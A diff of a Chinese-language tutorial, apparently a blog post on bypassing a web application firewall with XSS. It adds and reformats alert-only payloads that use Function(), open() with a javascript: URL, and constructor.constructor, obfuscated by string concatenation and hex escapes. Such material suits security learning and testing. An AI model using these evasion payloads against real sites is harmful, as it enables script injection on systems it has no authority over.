@@ -52,23 +52,23 @@ map函数可以返回一个数组`[1].map`，而且我们在使用`map`函数的
 
 如果我们向匿名函数内添加`形参`为函数alert，再执行函数，那么可以达到弹窗的效果嘛?
 
-`Function('alert(1)')();`答案显而易见。
+```Function('alert(1)')();```答案显而易见。
 
 ![6](https://ws1.sinaimg.cn/large/005DAKuvgy1g205htqg05j30ts09egmc.jpg)
 
 然而alert关键字还是太敏感了，可以尝试将形参编码。
 
-`Function('al\x65\x72\x74\x281\x29')();`
+```Function('al\x65\x72\x74\x281\x29')();```
 
 成功弹窗。
 
 ![7](https://ws1.sinaimg.cn/large/005DAKuvgy1g205pwfwjvj30ts09i0th.jpg)
 
-拼接也是可以达到同样的效果`Function('ale'%2b'rt(1)')();`
+拼接也是可以达到同样的效果```Function('ale'%2b'rt(1)')();```
 
 ### open()属性
 - - -
-open()方法属性打开一个新的浏览器窗口，可在括号内加入参数`open(alert(1))`
+open()方法属性打开一个新的浏览器窗口，可在括号内加入参数```open(alert(1))```
 
 成功弹窗。
 
@@ -76,9 +76,29 @@ open()方法属性打开一个新的浏览器窗口，可在括号内加入参�
 
 好玩的是，我们使用伪协议时，将会在新窗口弹出。
 
-`<body onpageshow=open('java'%2b'script:ale'%2b'rt(1)') >`
+```<body onpageshow=open('java'%2b'script:ale'%2b'rt(1)') >```
 
 ![9](https://ws1.sinaimg.cn/large/005DAKuvgy1g2079o9zibj30vn08k756.jpg)
 
 ### 神奇的constructor
 还记得前篇文章[测试WAF来学习XSS姿势(二)](https://www.anquanke.com/post/id/176300)执行代码姿势补充那段嘛，当时我以为自己，已经把`constructor`的坑填完了，早上起来查资料学习，又发现一个可用知识。
+
+constructor是一个对象的属性，这个属性存在在此对象的prototype中, 指向此对象的构造函数。如果该对象是它自己呢?
+
+```constructor.constructor(alert(1))```
+
+成功触发xss
+
+![10](https://ws1.sinaimg.cn/large/005DAKuvgy1g20oq60wojj30vn09mq3p.jpg)
+
+如果constructor带入的是完整的函数，比如alert,prompt,confirm，那么不需要执行。怎么理解呢?
+
+在这个demo中，我们将函数拼接，注意后面()括号，它是有必要的。
+
+```constructor.constructor('al'%2b'ert(1)')()```
+
+对于编码来说也是一样的，这里我们使用的是反引号，所以后面要跟着一对反引号。
+```
+constructor.constructor`al\x65rt\x28/xss/\x29```
+```
+
